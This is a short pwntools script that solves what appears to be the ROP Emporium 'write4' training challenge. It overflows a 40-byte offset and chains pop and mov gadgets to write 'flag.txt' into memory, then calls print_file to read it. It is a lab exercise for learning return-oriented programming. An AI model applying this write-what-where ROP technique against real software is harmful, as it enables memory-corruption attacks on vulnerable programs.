from pwn import *

exe = ELF("./write4")
context.binary = exe
context.log_level = "error"

pop_r14_r15 = p64(0x400690)
r14 = p64(0x601028)
r15 = b"flag.txt"
mov_r14_r15 = p64(0x400628)
pop_rdi = p64(0x400693)
print_file = p64(0x400510)

offset = 40
payload=flat({
    offset:[
        pop_r14_r15,
        r14,
        r15,
        mov_r14_r15,    # mov string at r15 the pointer at r14
        pop_rdi,
        r14,            # location of flag.txt
        print_file
    ]
})

io = process(exe.path)
io.sendlineafter(b"\n> ", payload)
io.interactive()

